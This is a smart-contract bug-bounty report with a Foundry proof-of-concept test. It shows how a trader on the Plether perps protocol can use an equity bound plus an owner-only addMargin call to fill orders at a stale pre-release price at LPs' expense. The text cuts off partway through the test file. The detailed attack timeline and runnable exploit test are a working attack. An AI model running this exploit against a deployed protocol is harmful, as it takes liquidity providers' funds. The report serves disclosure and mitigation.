# \#98975 [SC-Low] A trader can commit an order that only its own later `addMargin` makes fillable, so a prompt keeper can only cancel it and the price fixed at commit becomes a free option that LPs pay for

**Submitted on Nov 11th 2026 at 09:07:35 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98975
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

In a live market an order fills at the first Pyth tick after its commit second, whoever executes it and whenever, until its deadline. The protocol accepts this because orders are binding: the owner cannot cancel, and any keeper fills the order at once, before the owner can see later prices.

`minPostPositionEquityAssets` breaks that. It is a trader-set bound tested at execution against the position's live margin, and only the owner can raise that margin, with `CfdEngine.addMargin`, outside the queue. An increase whose own margin cannot meet the bound fails terminally for every executor. A keeper that arrives promptly can only cancel it, for an opening bounty of at most 0.20 USDG. Once the owner tops up the position, any executor fills the same order at the old price. `maxPostLeverageBps` reads the same margin.

The attack: commit a gated LONG increase in one account and a gated SHORT increase in another, two seconds before a scheduled data release. After the release, call `addMargin` on the side that is already in profit at the pre-release fill price. That is the attacker's only action after the release. The next keeper batch fills that order at the pre-release price and cancels the other. LPs pay the move.

Measured with release parameters, a 10,002,000 USDG pool and orders of 4,000,000 USDG notional, with a third-party keeper that executes 3 s after the commit and a fill price only 2 s old at the fill:
- basket -25 bps: attacker +5,956 USDG, LPs -7,559 USDG. Basket +25 bps: +5,983 / -7,586;
- control, the same orders and the same keeper timing without the bound: attacker -8,040 / -8,064, LPs +3,241 / +3,257;
- ±50 bps: +15,920 / +15,979, LPs -17,523 / -17,582. Break-even is about 10 bps;
- three releases in a row (-25, +30, -20 bps): attacker +16,992, LPs -21,558;
- a keeper that arrives before the release cancels both orders, and the attacker loses 0.40 USDG.

## Vulnerability Details

### Intended behaviour

Live execution "is bound to the first tick after the recorded `commitTime` rather than the keeper's reveal-time tick" ([`SECURITY.md#L647`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L647)), and the order stays executable until its deadline (60 s, [`OrderExecutionOrchestrator.sol#L11-L14`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11-L14)). The documented safeguard is that "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options" ([`SECURITY.md#L658-L659`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L658-L659); also [#L366](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L366), [`WHITEPAPER.md#L1137-L1142`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1137-L1142), and docs.plether.com "How orders execute": "If traders could cancel after seeing the next oracle observation, a commitment would become a free option").

For the one bound the team saw at risk, the specification guards against exactly this owner lever. The settlement-minimum guard "prevents owner withdrawals from manufacturing a settlement-minimum failure; it does not freeze market-dependent financial bounds" ([`ACCOUNTING_SPEC.md#L917-L931`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L917-L931)). The equity and leverage bounds are not market-dependent. They depend on margin that only the owner can change.

### Root cause

**1. The bounds are tested against live margin.** For an open or increase, the evaluator projects the margin as the current pledge plus the new pledge and checks both bounds on it ([`CfdOrderPolicyEvaluatorBase.sol#L366-L386`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L366-L386), [#L526-L539](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L526-L539)):

```solidity
        assessment.postPositionMarginAssets = delta.positionMarginAfterOpen;
        ...
        if (fullClose) {
            return;
        }
        ...
        if (assessment.postPositionEquityAssets < 0 || normalizedEquityAssets < bounds.minPostPositionEquityAssets) {
            revert ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation(
                OrderV3Types.ConstraintKind.PostPositionEquity,
                normalizedEquityAssets,
                bounds.minPostPositionEquityAssets
            );
        }
        _requireMaximum(OrderV3Types.ConstraintKind.PostLeverage, assessment.postLeverageBps, bounds.maxPostLeverageBps);
```

`positionMarginAfterOpen` starts from the pledge read from the clearinghouse at execution ([`CfdEnginePlanLib.sol#L546-L580`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L546-L580), [`CfdEngine.sol#L1372-L1389`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1372-L1389)). Equity is computed at the fill price, so with a fixed tick only margin moves it.

**2. Only the owner can raise that margin, at any time.** `addMargin` checks `msg.sender == account` and an open position, nothing about pending orders ([`CfdEngine.sol#L501-L529`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529)). A near-minimum position (2,000 USDG notional) is enough.

**3. For anyone else, executing the order cancels it.** `ConstraintViolation` is classified terminal ([`OrderRouterExecutionSidecar.sol#L564-L576`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L564-L576), [#L879-L893](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L879-L893)). Settlement releases the committed margin and pays the executor the opening bounty ([`OrderRouter.sol#L292-L344`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L292-L344)), which is 1 bp of notional capped at 0.20 USDG ([`OrderRouterBase.sol#L71-L74`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L71-L74)).

**4. Commitment accepts a bound the order cannot meet.** Fresh-request validation checks only that `maxPostLeverageBps` is non-zero. It never compares either bound with what the order can produce ([`OrderLiquidationBatchLogic.sol#L270-L319`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L270-L319)). For `minPostSettlementBalanceAssets` the same file restricts the bound, requires it to be funded at commit, and blocks withdrawals that would break it (`#L259-L267`, `#L303-L312`, [`CfdEngineSettlementSidecar.sol#L261-L272`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L261-L272)). Nothing comparable exists for the equity and leverage bounds, where the lever is `addMargin` rather than a withdrawal.

**5. The fill price is fixed by the commit second** ([`PletherOracle.sol#L610-L615`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L615): the first unique update in `(commitTime, min(commitTime + orderSettlementWindow, now)]`). This is fair for a binding order. With points 1 to 3 it gives the owner, and only the owner, the choice between "fill at the commit price" and "nothing", made after the next prices are known.

### Attack (the proof's main test)

Release at T (Tuesday 12:30:00 UTC, basket 1.0000, pool 10,002,000 USDG, two attacker accounts with 100,000 USDG each and a near-minimum position each):

| Time | Step |
| :-- | :-- |
| T-5 | A keeper refreshes the mark. This is the last refresh before the fill |
| T-2 | Account 1 commits a LONG increase and account 2 a SHORT increase: 4,000,000 USDG notional, 60,000 USDG margin, `minPostPositionEquityAssets` set 5,000 USDG above what pledge plus order margin can reach (`OrderRouter.commitOrder`) |
| T-1 | First tick after the commit second, basket 1.0000. This is both orders' fill price |
| T | Release: the basket moves 25 bps |
| T+1 | The attacker calls `CfdEngine.addMargin(30,000 USDG)` on the side in profit. Nothing else |
| T+1, next block | A third-party keeper calls `executeOrderBatch` with the T-1 tick. It fills the enabled order and cancels the other with `ConstraintViolation` |
| T+1, one block later | The attacker commits ordinary closes, which the keeper fills at the next tick, at the new price |

The test asserts that the T-1 fill tick is newer than the engine's cached mark (T-5). Under the same keeper timing without the bound, the keeper fills both orders and the trader only pays costs.

### Realistic window

- **Keeper speed.** The window runs from the release until the first third-party execution attempt. The protocol keeper polls every 5 s while idle and every 1 s with pending work ([plether-app PR #205](https://github.com/Plether-Fi/plether-app/pull/205)). On the Arbitrum Sepolia deployment, orders were executed 3 to 9 s after commit. With the commit at T-2, the attacker therefore has about 1 to 7 s after the release to land one `addMargin`. Committing behind other orders does not help: keepers clear consecutive orders in one `executeOrderBatch`.
- **Break-even.** The decision in the proof is made at T+1. Results for 4,000,000 USDG per side:

| Basket move | -50 | +50 | -25 | +25 | -15 | +15 | -12 | -10 | -8 bps |
| :-- | --: | --: | --: | --: | --: | --: | --: | --: | --: |
| Attacker, USDG | +15,920 | +15,979 | +5,956 | +5,983 | +1,970 | +1,984 | +774 | -22 | -819 |
| LPs, USDG | -17,523 | -17,582 | -7,559 | -7,586 | -3,573 | -3,588 | -2,377 | -1,580 | -783 |

  The round trip costs about 10 bps (two 4 bp execution fees plus the confidence shifts). Below that, the attacker just lets both orders be cancelled.
- **Losing the race** to a keeper that executes before the release costs 0.40 USDG (first test). A dedicated sub-second keeper would defeat the attack at that price per attempt. The attacker loses nothing else and can try again at the next release.
- **Atomicity is not needed.** Once the winning order is enabled, any executor fills it. Accounts can also be contracts (counterfactual accounts are explicitly allowed, [`MarginClearinghouse.sol#L365-L368`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L365-L368)), so the owner can enable, fill and drop in one transaction (last test).
- **Residual risk.** The edge is fixed at the fill, at the pre-release price. What remains is exposure from the fill until the exit order's own tick, 1 to 2 s, which can be hedged off-chain. In a very volatile release the exit tick can also exceed the 10 bps basket-confidence limit, which delays the exit. These affect payout, not the mechanism.
- **Size** is bounded by the 40% skew cap; the proof uses it. Pyth is the suite's mock, which enforces Pyth's range and first-update rules. No clock skew is assumed.

### Why this is not a known issue

- **SC Audit Studio SC-M4** (fixed). Even read as part of SC-M4's free-option family, this shows the fix at a82d4fef is incomplete, through a new mechanism:
  - a different lever in different code: `CfdOrderPolicyEvaluatorBase._enforceBounds` plus `CfdEngine.addMargin`, not keeper tick selection or a pool-depth change;
  - no LP capital and no LP flow;
  - it defeats the post-fix defence itself, a unique first tick plus a binding order that a prompt keeper fills. Here a prompt keeper can only cancel, and the proof's keeper executes 3 s after the commit;
  - the identical owner lever is already guarded, for the settlement minimum only ([`ACCOUNTING_SPEC.md#L917-L931`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L917-L931)).
- **AI scan, "Order execution accepts oracle updates older than the engine's cached mark."** That acceptance is not used. The fill tick is newer than the cached mark (asserted), the fill is 2 s after its tick, and the honest keeper executes it.
- **Cecuro HIGH-1 / clock alignment.** No clock skew is involved. The fill tick is strictly after the commit second, and the trader decides after committing. The team asked HIGH-1 for "evidence that the timing window is practically usable and gives traders an exploitable pricing advantage at LP expense". The proof gives that: profit in both directions with a keeper 3 s after the commit, against a loss under the same timing with binding orders, repeated over three releases.
- **SC-I2** asks for a cancel path, and **SECURITY.md "Router and keeper limitations"** documents that users cannot cancel ([#L1345](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1345)) and that policy failures are terminal. The finding is that the owner holds an on-switch that nobody else has. **Cecuro MED-16 / LOW-57** concern stale-mark admission; the mark is fresh here.

No listed report or SECURITY.md section mentions `minPostPositionEquityAssets`, `maxPostLeverageBps` or `addMargin` in connection with order execution.

## Impact Details

**Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical).** The profit is paid from HousePool cash, which is LP principal. The pool loses the attacker's profit plus execution fees, about 1,600 USDG per round, which go to the treasury.

- **Profit in both directions.** The side is chosen after the move: +5,956 on a fall, +5,983 on a rise.
- **Paid by LPs, not by market risk.** The same trader with binding orders under the same keeper timing loses 8,040 / 8,064 USDG, and LPs gain.
- **It scales and repeats.** Profit is about `(move - 10 bps) x notional`, with notional up to 40% of pool depth. Every scheduled release is another round: three rounds take 21,558 USDG from a 10M pool. A failed round costs 0.40 USDG.
- **Capital** is the order margin plus the top-up, returned at the close: 100,000 USDG per account here.

## Mitigation

- While an account has a pending order with a non-zero `minPostPositionEquityAssets` or a finite `maxPostLeverageBps`, reject `addMargin` for it, or evaluate both bounds against the margin recorded at commit plus the order's own margin. This mirrors the settlement-minimum guard.
- At commit, reject orders whose bounds fail with the order's own margin.
- Review other execution checks that read owner-movable balances, for example the negative-VPI reserve funded from free settlement ([`CfdEnginePlanLib.sol#L561-L567`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L561-L567)).

## References

- Bounds: [`CfdOrderPolicyEvaluatorBase.sol#L164-L176`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L164-L176), [#L325-L387](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L325-L387), [#L490-L540](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L490-L540); [`OrderV3Types.sol#L137-L151`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderV3Types.sol#L137-L151)
- Execution path: [`OrderRouterExecutionSidecar.sol#L129-L232`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L129-L232) (FIFO head), [#L447-L452](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L447-L452) (same-block and MEV boundary), [#L630-L655](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L630-L655)
- Release parameters: [`DEPLOYMENT.md#L123-L156`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L123-L156)


## Proof of Concept

## Proof of Concept

Install the file below as `packages/perps/test/poc/hunt-zi01v/ProofOwnerGatedLookBackFill.t.sol` in a checkout of [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8). It extends the repository's `test/perps/shared/HousePoolTestBase.sol`, and no contract in scope is modified. Run from `packages/perps`:

```bash
FOUNDRY_TEST=test/poc/hunt-zi01v forge test --match-path 'test/poc/hunt-zi01v/*.t.sol' -vv
```

`FOUNDRY_TEST` only limits the via-IR compile to the sources plus that directory.

The five tests:
1. `test_ThirdPartyExecutionOnlyCancels`: a keeper at the earliest possible moment (T-1) gets `Failed / ConstraintViolation` for both orders. No exposure is opened, the margin is released, the attacker's cost is 0.40 USDG, and a third party's `addMargin` reverts.
2. `test_OwnerEnablesWinnerAndKeeperFillsIt`: the main attack and its same-timing control, ±25 bps, all from one snapshot.
3. `test_BreakEvenSweep`: moves from -50 to +50 bps.
4. `test_RepeatsOnEveryRelease`: three releases one hour apart.
5. `test_ContractAccountDoesItInOneTransaction`: a contract account enables, fills and drops in one transaction.

Every attacker and keeper step is a public entrypoint (`OrderRouter.commitOrder`, `executeOrder`, `executeOrderBatch`, `updateMarkPrice`, `CfdEngine.addMargin`).

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../../perps/shared/HousePoolTestBase.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/**
 * Proof: `minPostPositionEquityAssets` is tested at execution against live position margin, and only the owner can
 * raise that margin (`CfdEngine.addMargin`, not queued). An increase whose own margin cannot meet the bound fails
 * terminally for any executor until its owner tops up the position. The fill price is fixed by the commit second.
 *
 * Timeline (release at T): both orders committed at T-2, fill tick T-1 (pre-release price), no mark refresh after
 * T-5. At T+1 the attacker calls addMargin on the winning side, nothing else. A third-party keeper processes the
 * FIFO queue with executeOrderBatch in the next block: it fills the enabled order at the T-1 price (2 s old, newer
 * than the engine mark) and cancels the other. The control has the same orders and keeper timing without the bound.
 *
 * Public entrypoints only; vm.prank only selects the sender. Suite helpers fund the pool and the accounts. Pyth is
 * the suite's mock (out of scope) and enforces Pyth's range and first-update rules. Release parameters (DEPLOYMENT.md).
 */
contract ProofOwnerGatedLookBackFill is HousePoolAsyncTestBase {

    address internal acctLong = makeAddr("attackerLong");
    address internal acctShort = makeAddr("attackerShort");
    address internal keeper = makeAddr("thirdPartyKeeper");
    address internal lp = makeAddr("lp");

    uint64 internal constant CONF = 40_000; // 4 bps of 1.00 on each feed
    uint256 internal constant SEED_SIZE = 2_000e18; // near-minimum position: addMargin needs one
    uint256 internal constant SEED_MARGIN = 100e6;
    uint256 internal constant TICKET_MARGIN = 60_000e6;
    uint256 internal constant GATE_HEADROOM = 5_000e6; // bound sits this far above what the order alone reaches
    uint256 internal constant GATE_TOPUP = 30_000e6;
    uint256 internal constant FIRST_RELEASE = 1_710_246_600; // Tue 2024-03-12 12:30:00 UTC, 08:30 New York

    uint256 internal ticketSize = 4_000_000e18; // 4,000,000 USDG notional, 40% of pool depth
    uint256 internal release = FIRST_RELEASE;
    uint256 internal priceBefore = 1e8;
    uint256 internal nonce;
    uint256 internal attackerStart;
    uint256 internal poolStart;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig(); // timelocked propose/finalize
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(config);
        vm.deal(keeper, 10 ether);
        vm.deal(address(this), 10 ether);
    }

    // ---------------------------------------------------------------- helpers

    function _goTo(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev One signed update per feed; the previous update is one second older.
    function _tick(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        MockPyth.MockPrice memory p = MockPyth.MockPrice(int64(uint64(price)), CONF, -8, publishTime, publishTime - 1);
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(BASE_PYTH_FEED_A, p);
        u[1] = MockPyth.FeedUpdate(BASE_PYTH_FEED_B, p);
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 minEquity
    ) internal returns (OrderV3Types.OrderRequest memory) {
        uint256 window = router.maxExecutionWindowSeconds();
        bool low = (side == CfdTypes.Side.LONG) != isClose;
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("zi01", ++nonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: low ? 1 : engine.CAP_PRICE(),
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: minEquity,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _execute(
        uint64 id,
        bytes[] memory data
    ) internal returns (OrderV3Types.ExecutionResult memory) {
        uint256 fee = router.pletherOracle().getOrderExecutionFee(data);
        vm.prank(keeper);
        return router.executeOrder{value: fee}(id, data);
    }

    function _assertCancelled(
        OrderV3Types.ExecutionResult memory r
    ) internal pure {
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "failed");
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "by the bound");
    }

    /// @dev Ordinary order: the account commits, the keeper fills it at the next second's tick.
    function _commitAndFill(
        address account,
        OrderV3Types.OrderRequest memory request,
        uint256 price
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        uint256 t = vm.getBlockTimestamp();
        _goTo(t + 1);
        assertEq(uint8(_execute(id, _tick(price, t + 1)).status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory data = _tick(price, vm.getBlockTimestamp());
        uint256 fee = router.pletherOracle().getUpdateFee(data);
        vm.prank(keeper);
        router.updateMarkPrice{value: fee}(data);
    }

    function _size(
        address a
    ) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _wealth() internal view returns (uint256) {
        return clearinghouse.balanceAssets(acctLong) + clearinghouse.balanceAssets(acctShort);
    }

    function _priceAfter(
        int256 bps
    ) internal view returns (uint256) {
        return uint256(int256(priceBefore) + (int256(priceBefore) * bps) / 10_000);
    }

    function _prepare() internal {
        _depositAsync(juniorVault, lp, 9_000_000e6); // third-party LP on top of the fixture's 1M
        _finishAsyncCooldown(juniorVault, lp);
        _fundTrader(acctLong, 100_000e6);
        _fundTrader(acctShort, 100_000e6);
        _goTo(release - 3600);
        _refreshMark(priceBefore);
        attackerStart = _wealth();
        poolStart = pool.totalAssets();
    }

    /// @dev Seeds if needed, then at T-2 a LONG and a SHORT increase. `gated` sets the equity bound 5,000 USDG above
    ///      the account's pledge plus the order's own margin.
    function _commitTickets(
        bool gated
    ) internal returns (uint64 idLong, uint64 idShort) {
        _goTo(release - 900);
        _refreshMark(priceBefore);
        if (_size(acctLong) == 0) {
            _commitAndFill(acctLong, _request(CfdTypes.Side.LONG, SEED_SIZE, SEED_MARGIN, false, 0), priceBefore);
        }
        if (_size(acctShort) == 0) {
            _commitAndFill(acctShort, _request(CfdTypes.Side.SHORT, SEED_SIZE, SEED_MARGIN, false, 0), priceBefore);
        }
        _goTo(release - 5);
        _refreshMark(priceBefore); // last mark refresh before the fill
        _goTo(release - 2);
        uint256 gateL = gated ? clearinghouse.pnlPledgeAssets(acctLong) + TICKET_MARGIN + GATE_HEADROOM : 0;
        uint256 gateS = gated ? clearinghouse.pnlPledgeAssets(acctShort) + TICKET_MARGIN + GATE_HEADROOM : 0;
        OrderV3Types.OrderRequest memory rl = _request(CfdTypes.Side.LONG, ticketSize, TICKET_MARGIN, false, gateL);
        OrderV3Types.OrderRequest memory rs = _request(CfdTypes.Side.SHORT, ticketSize, TICKET_MARGIN, false, gateS);
        vm.prank(acctLong);
        idLong = router.commitOrder(rl);
        vm.prank(acctShort);
        idShort = router.commitOrder(rs);
    }

    /// @dev Ordinary closes filled by the keeper at `price`, then everything is checked flat.
    function _closeAll(
        uint256 price,
        bool shortFirst
    ) internal returns (int256 attackerPnl, int256 lpDelta) {
        for (uint256 i; i < 2; i++) {
            bool s = shortFirst == (i == 0);
            address a = s ? acctShort : acctLong;
            CfdTypes.Side side = s ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
            if (_size(a) > 0) _commitAndFill(a, _request(side, _size(a), 0, true, 0), price);
        }
        assertEq(_size(acctLong) + _size(acctShort), 0, "flat");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim left");
        assertEq(router.pendingOrderCounts(acctLong) + router.pendingOrderCounts(acctShort), 0, "no order left");
        attackerPnl = int256(_wealth()) - int256(attackerStart);
        lpDelta = int256(pool.totalAssets()) - int256(poolStart);
    }

    /// @dev One release. `gated`: at T+1 the attacker calls addMargin on the winning side and nothing else; the
    ///      keeper batch in the next block does the rest. Control: no bound, no addMargin, same keeper batch.
    function _round(
        int256 moveBps,
        bool gated
    ) internal returns (int256 attackerPnl, int256 lpDelta) {
        uint256 priceAfter = _priceAfter(moveBps);
        (, uint64 idShort) = _commitTickets(gated);
        uint256 longBefore = _size(acctLong);
        uint256 shortBefore = _size(acctShort);

        _goTo(release + 1); // the release moved the basket at T; the attacker has seen it
        bool longWins = priceAfter < priceBefore;
        if (gated) {
            address winner = longWins ? acctLong : acctShort;
            vm.prank(winner);
            engine.addMargin(winner, GATE_TOPUP);
        }
        assertLt(engine.lastMarkTime(), release - 1, "fill tick is newer than the engine mark");

        _nextBlock();
        bytes[] memory fillTick = _tick(priceBefore, release - 1);
        uint256 fee = router.pletherOracle().getOrderExecutionFee(fillTick);
        vm.prank(keeper);
        router.executeOrderBatch{value: 2 * fee}(idShort, fillTick);
        bool longFilled = !gated || longWins;
        bool shortFilled = !gated || !longWins;
        assertEq(_size(acctLong), longBefore + (longFilled ? ticketSize : 0), "LONG");
        assertEq(_size(acctShort), shortBefore + (shortFilled ? ticketSize : 0), "SHORT");

        _nextBlock();
        return _closeAll(priceAfter, !gated);
    }

    function _log(
        string memory label,
        int256 moveBps,
        int256 attackerPnl,
        int256 lpDelta
    ) internal {
        emit log(label);
        emit log_named_int("  basket move at the release, bps", moveBps);
        emit log_named_int("  attacker P&L, USDG", attackerPnl / 1e6);
        emit log_named_int("  LP pool delta, USDG", lpDelta / 1e6);
    }

    // ---------------------------------------------------------------- tests

    /// A third party that executes the gated orders at the first possible moment (T-1) can only cancel them.
    function test_ThirdPartyExecutionOnlyCancels() public {
        _prepare();
        (uint64 idLong, uint64 idShort) = _commitTickets(true);
        uint256 wealthBefore = _wealth();
        uint256 longBefore = _size(acctLong);
        uint256 shortBefore = _size(acctShort);

        vm.prank(keeper);
        vm.expectRevert();
        engine.addMargin(acctLong, 1e6); // owner-only

        _goTo(release - 1);
        bytes[] memory fillTick = _tick(priceBefore, release - 1);
        _assertCancelled(_execute(idLong, fillTick));
        _assertCancelled(_execute(idShort, fillTick));
        assertEq(_size(acctLong), longBefore, "no LONG exposure");
        assertEq(_size(acctShort), shortBefore, "no SHORT exposure");
        assertEq(clearinghouse.getPnlIsolationBuckets(acctLong).orderMarginAssets, 0, "order margin released");
        uint256 cost = wealthBefore - _wealth();
        assertLe(cost, 2 * router.maxOpenOrderExecutionBountyAssets());
        emit log_named_uint("cost of two cancelled 4,000,000 USDG orders, USDG atoms", cost);
    }

    /// Headline: keeper 3 s after the commit. Gated orders: the keeper fills the winner. Control: it fills both.
    function test_OwnerEnablesWinnerAndKeeperFillsIt() public {
        _prepare();
        emit log_named_uint("pool assets before, USDG", pool.totalAssets() / 1e6);
        int256[2] memory moves = [int256(-25), int256(25)];
        for (uint256 i; i < 2; i++) {
            uint256 snap = vm.snapshotState();
            (int256 a, int256 aLp) = _round(moves[i], true);
            vm.revertToState(snap);
            snap = vm.snapshotState();
            (int256 c, int256 cLp) = _round(moves[i], false);
            vm.revertToState(snap);
            _log("attack: addMargin at T+1, keeper batch fills the winner at the T-1 price", moves[i], a, aLp);
            _log("control: same orders and keeper timing, no bound", moves[i], c, cLp);
            assertGt(a, 5_000e6, "attacker profits in both directions");
            assertLt(aLp, -5_000e6, "paid by LPs");
            assertLt(c, 0, "binding orders: no profit");
            assertGe(cLp, 0, "binding orders: LPs whole");
        }
    }

    /// Break-even: the move seen by T+1 must exceed the round-trip cost, about 10 bps.
    function test_BreakEvenSweep() public {
        _prepare();
        int256[7] memory moves = [int256(-50), int256(50), int256(-15), int256(15), int256(-12), int256(-10), int256(-8)];
        for (uint256 i; i < moves.length; i++) {
            uint256 snap = vm.snapshotState();
            (int256 a, int256 aLp) = _round(moves[i], true);
            vm.revertToState(snap);
            _log("attack", moves[i], a, aLp);
